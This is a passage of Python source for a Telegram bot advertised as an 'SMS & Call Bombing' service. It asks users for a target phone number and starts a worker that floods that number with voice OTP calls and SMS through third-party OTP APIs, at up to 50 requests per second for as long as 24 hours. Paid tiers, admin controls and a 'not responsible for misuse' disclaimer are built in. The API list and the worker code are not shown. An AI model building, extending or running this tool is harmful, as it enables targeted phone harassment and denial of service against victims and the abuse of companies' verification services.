            [InlineKeyboardButton("⏹ STOP BOMBING", callback_data=f"stop_{session_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Check if we have a previous message to edit
        if chat_id not in user_states:
            user_states[chat_id] = {}
        
        last_update_id = user_states[chat_id].get('last_update_id')
        
        if not last_update_id:
            msg = await context.bot.send_message(
                chat_id=chat_id,
                text=message,
                reply_markup=reply_markup,
                parse_mode=ParseMode.HTML
            )
            user_states[chat_id]['last_update_id'] = msg.message_id
        else:
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=last_update_id,
                    text=message,
                    reply_markup=reply_markup,
                    parse_mode=ParseMode.HTML
                )
            except:
                # Send new message if edit fails
                try:
                    await context.bot.delete_message(chat_id=chat_id, message_id=last_update_id)
                except:
                    pass
                
                msg = await context.bot.send_message(
                    chat_id=chat_id,
                    text=message,
                    reply_markup=reply_markup,
                    parse_mode=ParseMode.HTML
                )
                user_states[chat_id]['last_update_id'] = msg.message_id
                
    except Exception as e:
        logger.error(f"Failed to send bombing update: {e}")

async def format_plan_expiry(expiry_str: str) -> str:
    """Format plan expiry date"""
    try:
        expiry_date = datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
        now = datetime.now()
        if expiry_date < now:
            return "EXPIRED"
        
        delta = expiry_date - now
        days = delta.days
        hours = delta.seconds // 3600
        
        if days > 0:
            return f"{days} days"
        else:
            return f"{hours} hours"
    except:
        return "Unknown"

# ==================== BOT COMMANDS ====================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    chat_id = update.effective_chat.id
    
    # Check channel membership
    if not await force_join_check(update, context):
        return
    
    # Add user to database
    db.add_user(chat_id, user.username, user.first_name, user.last_name)
    
    # Log action
    try:
        await log_action(context, f"/start command", user)
    except Exception as e:
        logger.error(f"Failed to log action: {e}")
    
    # Check if user is banned
    user_data = db.get_user(chat_id)
    if user_data and user_data.get('is_banned'):
        await update.message.reply_text("❌ You have been banned from using this bot.")
        return
    
    # Count total APIs
    total_apis = len(APIS['call']['91']) + len(APIS['sms']['91'])
    
    # Welcome message
    expiry_text = await format_plan_expiry(user_data['plan_expiry']) if user_data else "30 days"
    
    welcome_text = f"""
👋 Welcome <b>{user.first_name}</b>!

🚀 <b>ULTRA-FAST SMS & Call Bombing Bot v{BOT_VERSION}</b>

<b>Available Plans (30 days expiry):</b>
• 🆓 <b>Free:</b> 1 minute bombing (10 reqs/sec)
• ⭐ <b>Premium:</b> 4 hours bombing (30 reqs/sec)  
• 👑 <b>Ultra:</b> 24 hours bombing (50 reqs/sec)

<b>Your Plan:</b> {user_data['plan'].upper() if user_data else 'FREE'}
<b>Expires in:</b> {expiry_text}

<b>⚡ ULTRA-FAST Features:</b>
• Voice OTP Calls FIRST
• Then SMS Bombing
• {len(APIS['call']['91'])} Call APIs
• {len(APIS['sms']['91'])} SMS APIs
• <b>{total_apis} Total APIs</b>
• Free: 10 reqs/sec (1 minute)
• Premium: 30 reqs/sec (4 hours)
• Ultra: 50 reqs/sec (24 hours)
• Live status with STOP button

<b>Commands:</b>
/start - Start bot
/bomb - Start bombing
/plan - View plan
/stats - Your stats
/help - Help info

<b>👨‍💻 Developer:</b> {BOT_DEVELOPER}

⚠️ <i>Use responsibly. Plans expire after 30 days.</i>
"""
    
    keyboard = [
        [InlineKeyboardButton("💣 Start Bombing", callback_data="start_bombing")],
        [InlineKeyboardButton("📊 View Plans", callback_data="view_plans")],
        [InlineKeyboardButton("📈 Your Stats", callback_data="user_stats")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /bomb command"""
    chat_id = update.effective_chat.id
    user = update.effective_user
    
    # Check channel membership
    if not await force_join_check(update, context):
        return
    
    # Check if user can bomb
    can_bomb, reason = db.can_user_bomb(chat_id)
    if not can_bomb:
        await update.message.reply_text(f"❌ {reason}")
        return
    
    # Check if user already has an active bombing session
    for session_id, session in active_sessions.items():
        if session.get('chat_id') == chat_id and session.get('active'):
            await update.message.reply_text("⚠️ You already have an active bombing session!")
            return
    
    # Get user data
    user_data = db.get_user(chat_id)
    if not user_data:
        await update.message.reply_text("❌ User not found. Please /start again.")
        return
    
    # Check plan expiry
    expiry_text = await format_plan_expiry(user_data['plan_expiry'])
    if expiry_text == "EXPIRED":
        db.update_user_plan(chat_id, 'free')
        await update.message.reply_text("⚠️ Your plan has expired. You've been downgraded to Free plan.")
        user_data = db.get_user(chat_id)
    
    # Get speed info
    plan = user_data['plan']
    if plan == "free":
        speed = FREE_SPEED
        duration_text = "1 minute"
    elif plan == "premium":
        speed = PREMIUM_SPEED
        duration_text = "4 hours"
    elif plan == "ultra":
        speed = ULTRA_SPEED
        duration_text = "24 hours"
    else:
        speed = FREE_SPEED
        duration_text = "1 minute"
    
    # Count APIs
    total_apis = len(APIS['call']['91']) + len(APIS['sms']['91'])
    
    # Ask for phone number
    await update.message.reply_text(
        f"📱 <b>Enter Target Phone Number</b>\n\n"
        f"Please reply with the target phone number:\n"
        f"<code>911234567890</code> (India: 91 + 10-digit number)\n\n"
        f"<i>Format: CountryCode + Number (without +)</i>\n"
        f"<b>⚡ Ultra-Fast Mode:</b>\n"
        f"• Plan: {plan.upper()}\n"
        f"• Duration: {duration_text}\n"
        f"• Speed: {speed} requests/second\n"
        f"• Total APIs: {total_apis}\n"
        f"• Voice OTP calls will be sent first\n\n"
        f"<b>👨‍💻 Developer:</b> {BOT_DEVELOPER}",
        parse_mode=ParseMode.HTML
    )
    
    # Set user state
    if chat_id not in user_states:
        user_states[chat_id] = {}
    user_states[chat_id]['waiting_for_number'] = True

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle user messages"""
    chat_id = update.effective_chat.id
    user = update.effective_user
    message_text = update.message.text.strip()
    
    # Check if user is waiting for phone number
    if chat_id in user_states and user_states[chat_id].get('waiting_for_number'):
        # Validate phone number
        if not message_text.isdigit() or len(message_text) < 10:
            await update.message.reply_text("❌ Invalid phone number. Please enter digits only (e.g., 911234567890).")
            return
        
        # Extract country code (first 2 digits)
        country_code = message_text[:2]
        target_number = message_text[2:]  # Remove country code for API
        
        # Check if we have APIs for this country
        if country_code not in APIS['call'] and country_code not in APIS['sms']:
            await update.message.reply_text(f"❌ Country code {country_code} not supported. Currently only 91 (India) is supported.")
            user_states[chat_id]['waiting_for_number'] = False
            return
        
        # Get user data
        user_data = db.get_user(chat_id)
        if not user_data:
            await update.message.reply_text("❌ User not found. Please /start again.")
            user_states[chat_id]['waiting_for_number'] = False
            return
        
        plan = user_data['plan']
        duration = db.get_bombing_duration(plan)
        
        # Get speed info
        if plan == "free":
            speed = FREE_SPEED
        elif plan == "premium":
            speed = PREMIUM_SPEED
        elif plan == "ultra":
            speed = ULTRA_SPEED
        else:
            speed = FREE_SPEED
        
        # Log bombing action
        try:
            await log_action(context, f"Started bombing", user, message_text)
        except Exception as e:
            logger.error(f"Failed to log bombing action: {e}")
        
        # Create bombing session
        session_id = db.create_bombing_session(chat_id, message_text, plan)
        
        # Count APIs
        call_count = len(APIS['call'].get(country_code, []))
        sms_count = len(APIS['sms'].get(country_code, []))
        total_apis = call_count + sms_count
        
        # Send initial message with STOP button
        initial_message = f"""
🚀 <b>ULTRA-FAST Bombing Started</b>

📱 <b>Target:</b> {message_text}
📞 <b>Call APIs:</b> {call_count}
💬 <b>SMS APIs:</b> {sms_count}
⚡ <b>Total APIs:</b> {total_apis}
🔥 <b>Max Speed:</b> {speed} requests/second
🔄 <b>Status:</b> 🟢 Starting Voice OTP calls...
⏱ <b>Duration:</b> {duration//60} minutes
📊 <b>Requests:</b> 0
✅ <b>Success Rate:</b> 0%

<b>⚠️ Voice OTP calls will be sent FIRST!</b>
<b>👨‍💻 Developer:</b> {BOT_DEVELOPER}
"""
        
        keyboard = [
            [InlineKeyboardButton("⏹ STOP BOMBING", callback_data=f"stop_{session_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        msg = await update.message.reply_text(initial_message, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
        
        # Store message ID for updates
        user_states[chat_id]['last_update_id'] = msg.message_id
        user_states[chat_id]['waiting_for_number'] = False
        user_states[chat_id]['current_session'] = session_id
        
        # Start bombing worker
        asyncio.create_task(
            bombing_worker(session_id, target_number, country_code, duration, context, chat_id, plan)
        )
        return
    
    # Handle broadcast message for admin
    if 'broadcast_state' in context.user_data and context.user_data['broadcast_state']:
        await handle_broadcast_message(update, context)

async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /plan command"""
    chat_id = update.effective_chat.id
    
    # Check channel membership
    if not await force_join_check(update, context):
        return
    
    user_data = db.get_user(chat_id)
    
    if not user_data:
        await update.message.reply_text("❌ User not found. Please /start first.")
        return
    
    plan = user_data['plan']
    expiry = user_data['plan_expiry']
    bomb_count = user_data['bomb_count']
    total_spam = user_data['total_spam']
    expiry_text = await format_plan_expiry(expiry)
    
    # Get plan details
    if plan == "free":
        duration = "1 minute"
        speed = "10 reqs/sec"
        price = "Free"
        features = ["1 min bombing", "Voice OTP + SMS", "10 reqs/sec", "30 days expiry"]
    elif plan == "premium":
        duration = "4 hours"
        speed = "30 reqs/sec"
        price = "Contact Admin"
        features = ["4 hour bombing", "Voice OTP priority", "All APIs", "30 reqs/sec", "30 days expiry"]
    elif plan == "ultra":
        duration = "24 hours"
        speed = "50 reqs/sec"
        price = "Contact Admin"
        features = ["24 hour bombing", "Voice OTP first", "All APIs", "50 reqs/sec", "VIP support", "30 days expiry"]
    else:
        duration = "1 minute"
        speed = "10 reqs/sec"
        price = "Free"
        features = ["1 min bombing", "Basic features", "30 days expiry"]
    
    # Count APIs
    total_apis = len(APIS['call']['91']) + len(APIS['sms']['91'])
    
    plan_text = f"""
📊 <b>Your Plan Details</b>

<b>Current Plan:</b> {plan.upper()}
<b>Bombing Duration:</b> {duration}
<b>Max Speed:</b> {speed}
<b>Plan Expires:</b> {expiry_text}
<b>Total Bombs:</b> {bomb_count}
<b>Total Spam Sent:</b> {total_spam:,}

<b>⚡ Bot Features:</b>
"""
    for feature in features:
        plan_text += f"• {feature}\n"
    
    plan_text += f"\n<b>Total APIs:</b> {total_apis}"
    plan_text += f"\n<b>Price:</b> {price}"
    plan_text += f"\n\n<b>👨‍💻 Developer:</b> {BOT_DEVELOPER}"
    
    keyboard = []
    if plan == "free":
        keyboard.append([InlineKeyboardButton("⭐ Upgrade to Premium", callback_data="upgrade_premium")])
        keyboard.append([InlineKeyboardButton("👑 Upgrade to Ultra", callback_data="upgrade_ultra")])
    
    if expiry_text == "EXPIRED" or expiry_text.endswith("hours"):
        keyboard.append([InlineKeyboardButton("🔄 Renew Plan", callback_data="renew_plan")])
    
    reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
    
    await update.message.reply_text(plan_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stats command"""
    chat_id = update.effective_chat.id
    
    # Check channel membership
    if not await force_join_check(update, context):
        return
    
    user_data = db.get_user(chat_id)
    
    if not user_data:
        await update.message.reply_text("❌ User not found. Please /start first.")
        return
    
    expiry_text = await format_plan_expiry(user_data['plan_expiry'])
    
    # Count APIs
    total_apis = len(APIS['call']['91']) + len(APIS['sms']['91'])
    
    stats_text = f"""
📈 <b>Your Statistics</b>

<b>Account:</b>
• Plan: {user_data['plan'].upper()}
• Expires: {expiry_text}
• Joined: {user_data['created_at'][:10]}

<b>Bombing Stats:</b>
• Total Bomb Sessions: {user_data['bomb_count']}
• Total Spam Sent: {user_data['total_spam']:,}
• Last Bomb: {user_data['last_bomb_time'][:19] if user_data['last_bomb_time'] else 'Never'}

<b>⚡ Bot Features:</b>
• Call APIs: {len(APIS['call']['91'])} (Voice OTP first)
• SMS APIs: {len(APIS['sms']['91'])}
• Total APIs: {total_apis}
• Free: 10 reqs/sec (1 minute)
• Premium: 30 reqs/sec (4 hours)
• Ultra: 50 reqs/sec (24 hours)
• All plans: 30 days expiry

<b>👨‍💻 Developer:</b> {BOT_DEVELOPER}
"""
    
    await update.message.reply_text(stats_text, parse_mode=ParseMode.HTML)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    total_apis = len(APIS['call']['91']) + len(APIS['sms']['91'])
    
    help_text = f"""
🆘 <b>Help & Instructions</b>

<b>How to use:</b>
1. Join {CHANNEL_USERNAME}
2. Use /bomb or click "Start Bombing"
3. Enter target phone number (e.g., 911234567890)
4. Voice OTP calls will be sent FIRST
5. Then SMS bombing starts automatically
6. Use STOP button to stop anytime

<b>Commands:</b>
/start - Start the bot
/bomb - Start bombing session
/plan - View your current plan
/stats - View your statistics
/help - Show this help message

<b>⚡ ULTRA-FAST Features:</b>
• Voice OTP calls first
• {total_apis} Total APIs
• Free: 10 reqs/sec (1 minute)
• Premium: 30 reqs/sec (4 hours)
• Ultra: 50 reqs/sec (24 hours)
• STOP button in sessions
• 30 days plan expiry

<b>Plans (30 days expiry):</b>
• Free: 1 minute per session (10 reqs/sec)
• Premium: 4 hours per session (30 reqs/sec)  
• Ultra: 24 hours per session (50 reqs/sec)

<b>Important:</b>
• You must join {CHANNEL_USERNAME}
• All plans expire after 30 days
• Use responsibly
• Don't bomb emergency numbers
• The bot owner is not responsible for misuse

<b>👨‍💻 Developer:</b> {BOT_DEVELOPER}

<b>Support:</b>
Contact admin for upgrades or help
"""
    await update.message.reply_text(help_text, parse_mode=ParseMode.HTML)

# ==================== ADMIN COMMANDS ====================
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /admin command"""
    chat_id = update.effective_chat.id
    
    if chat_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use admin commands.")
        return
    
    keyboard = [
        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        [InlineKeyboardButton("👥 Manage Users", callback_data="admin_users")],
        [InlineKeyboardButton("📤 Export Users", callback_data="admin_export")],
        [InlineKeyboardButton("🔧 System", callback_data="admin_system")],
        [InlineKeyboardButton("🔄 Check Expiry", callback_data="check_expiry")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🛠 <b>Admin Panel</b>\n\nSelect an option:\n\n<b>Developer:</b> {BOT_DEVELOPER}",
        reply_markup=reply_markup,
        parse_mode=ParseMode.HTML
    )

# ... [Rest of admin functions remain the same but add BOT_DEVELOPER in messages] ...

# ==================== CALLBACK HANDLERS ====================
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle callback queries"""
    query = update.callback_query
    data = query.data
    
    try:
        if data == "check_join":
            # Check if user has joined channel
            is_member = await check_channel_membership(context, query.from_user.id)
            if is_member:
                await query.answer("✅ Thanks for joining! You can now use the bot.")
                await query.message.delete()
                await start_command(update, context)
            else:
                await query.answer("❌ You haven't joined the channel yet!")
        
        elif data == "start_bombing":
            await bomb_command(update, context)
        
        elif data == "view_plans":
            await plan_command(update, context)
        
        elif data == "user_stats":
            await stats_command(update, context)
        
        elif data == "help":
            await help_command(update, context)
        
        elif data == "renew_plan":
            await query.answer(f"Contact admin to renew your plan!\n\nDeveloper: {BOT_DEVELOPER}")
        
        elif data.startswith("stop_"):
            session_id = int(data.replace("stop_", ""))
            if session_id in active_sessions:
                active_sessions[session_id]['active'] = False
                await query.answer("⏹ Bombing stopped!")
                
                # Send final update
                session_data = active_sessions[session_id]
                stop_msg = f"""
⏹️ <b>BOMBING STOPPED</b>

📱 <b>Target:</b> {session_data.get('target', 'Unknown')}
📊 <b>Total Requests:</b> {session_data.get('requests_sent', 0):,}
✅ <b>Successful:</b> {session_data.get('successful', 0):,}

<i>Session terminated by user request.</i>

<b>👨‍💻 Developer:</b> {BOT_DEVELOPER}
"""
                
                keyboard = [
                    [InlineKeyboardButton("💣 Start New Bombing", callback_data="start_bombing")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                try:
                    await query.edit_message_text(
                        stop_msg,
                        reply_markup=reply_markup,
                        parse_mode=ParseMode.HTML
                    )
                except:
                    await query.message.reply_text(stop_msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
            else:
                await query.answer("Session not found or already stopped!")
        
        elif data.startswith("upgrade_"):
            if data == "upgrade_premium":
                await query.answer(f"Contact admin to upgrade to Premium!\n\nDeveloper: {BOT_DEVELOPER}")
            elif data == "upgrade_ultra":
                await query.answer(f"Contact admin to upgrade to Ultra!\n\nDeveloper: {BOT_DEVELOPER}")
        
        # Admin callbacks
        elif data == "admin_panel":
            await admin_command(update, context)
        elif data == "admin_stats":
            await handle_admin_stats(update, context)
        elif data == "admin_users":
            await handle_admin_users(update, context)
        elif data.startswith("manage_user_"):
            await handle_manage_user(update, context)
        elif data.startswith(("ban_user_", "unban_user_", "upgrade_user_", "downgrade_user_", "extend_user_")):
            await handle_user_action(update, context)
        elif data == "admin_broadcast":
            await handle_admin_broadcast(update, context)
        elif data == "admin_export":
            await handle_admin_export(update, context)
        elif data == "admin_system":
            await handle_admin_system(update, context)
        elif data == "check_expiry":
            await handle_check_expiry(update, context)
        elif data == "downgrade_expired":
            await handle_downgrade_expired(update, context)
        elif data == "force_downgrade":
            await handle_force_downgrade(update, context)
        elif data == "clean_sessions":
            await handle_clean_sessions(update, context)
        elif data == "api_status":
            await handle_api_status(update, context)
        
        await query.answer()
    except Exception as e:
        logger.error(f"Callback error: {e}")
        await query.answer("An error occurred!")

# ... [Rest of admin handler functions remain the same] ...

# ==================== MAIN FUNCTION ====================
def main():
    """Start the bot"""
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("bomb", bomb_command))
    application.add_handler(CommandHandler("plan", plan_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("admin", admin_command))
    
    # Add message handler
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Add callback query handler
    application.add_handler(CallbackQueryHandler(callback_handler))
    
    # Count APIs
    total_apis = len(APIS['call']['91']) + len(APIS['sms']['91'])
    
    # Start the bot
    print("=" * 60)
    print("🤖 ULTRA-FAST SMS & Call Bombing Bot")
    print("=" * 60)
    print(f"📊 Database: {db.db_name}")
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"📝 Logging to chat: {LOGGING_CHAT_ID}")
    print(f"📢 Force Join: {CHANNEL_USERNAME}")
    print(f"📡 Total APIs: {total_apis}")
    print(f"   • Call APIs: {len(APIS['call']['91'])} (Voice OTP FIRST)")
    print(f"   • SMS APIs: {len(APIS['sms']['91'])}")
    print(f"⚡ Speed Configuration:")
    print(f"   • Free: {FREE_SPEED} reqs/sec (1 minute)")
    print(f"   • Premium: {PREMIUM_SPEED} reqs/sec (4 hours)")
    print(f"   • Ultra: {ULTRA_SPEED} reqs/sec (24 hours)")
    print(f"⏰ All plans expire in: 30 days")
    print(f"🔄 Auto-downgrade: Every 1 hour")
    print(f"⏹ STOP button: Enabled in all sessions")
    print(f"👨‍💻 Developer: {BOT_DEVELOPER}")
    print(f"📱 Version: {BOT_VERSION}")
    print("=" * 60)
    print("🚀 Bot is starting in ULTRA-FAST mode...")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()